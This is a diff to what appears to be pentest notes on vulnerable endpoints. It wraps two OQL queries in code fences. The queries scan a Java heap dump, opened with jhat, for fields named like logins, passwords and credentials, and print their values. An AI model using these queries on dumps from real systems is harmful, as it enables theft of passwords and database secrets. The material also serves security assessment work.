@@ -42,13 +42,12 @@ This endpoints are vulnerable :
 >  jhat -port 7401 -J-Xmx4G /tmp/file.hprof
 
 Usefull OQL querys:
-
-	select filter(map( map(filter(heap.classes(), function(it) { var interests = /login|password|username|database|creds|credential|p4ss|l0g1n|l0gin|us3r|admin|4dm1n/; for(field in it.fields) if(interests.test(it.fields[field].name.toLowerCase())) return  true; return  false; }), "heap.objects(it, true)"), function(it) { var res = ""; var interests = /login|password|username|database|creds|credential|p4ss|l0g1n|l0gin|us3r|admin|4dm1n/; while (it.hasMoreElements()) { it = it.nextElement(); for(field in it) { if(interests.test(field.toLowerCase())) { if(res !== '') res += ', '; res += field + ' : ' + (it[field] ? (it[field].value ? it[field].value.toString() : it[field].toString()) : it[field]); } } } return res; }), "it");
+```SQL
+select filter(map( map(filter(heap.classes(), function(it) { var interests = /login|password|username|database|creds|credential|p4ss|l0g1n|l0gin|us3r|admin|4dm1n/; for(field in it.fields) if(interests.test(it.fields[field].name.toLowerCase())) return  true; return  false; }), "heap.objects(it, true)"), function(it) { var res = ""; var interests = /login|password|username|database|creds|credential|p4ss|l0g1n|l0gin|us3r|admin|4dm1n/; while (it.hasMoreElements()) { it = it.nextElement(); for(field in it) { if(interests.test(field.toLowerCase())) { if(res !== '') res += ', '; res += field + ' : ' + (it[field] ? (it[field].value ? it[field].value.toString() : it[field].toString()) : it[field]); } } } return res; }), "it");
+```
 
 and
 
-    select filter( map(filter(heap.classes(), "it.statics"), function(it) { var res = ''; var interests = /login|password|username|database|creds|credential|p4ss|l0g1n|l0gin|us3r|admin|4dm1n/; for (field in it.statics) { if(interests.test(field.toLowerCase())) { if(res !== '') res += ', '; res += field + ' : ' + it.statics[field].toString(); } } return res; } ), "it");
-
-   
-   
-
+```SQL
+select filter( map(filter(heap.classes(), "it.statics"), function(it) { var res = ''; var interests = /login|password|username|database|creds|credential|p4ss|l0g1n|l0gin|us3r|admin|4dm1n/; for (field in it.statics) { if(interests.test(field.toLowerCase())) { if(res !== '') res += ', '; res += field + ' : ' + it.statics[field].toString(); } } return res; } ), "it");
+```
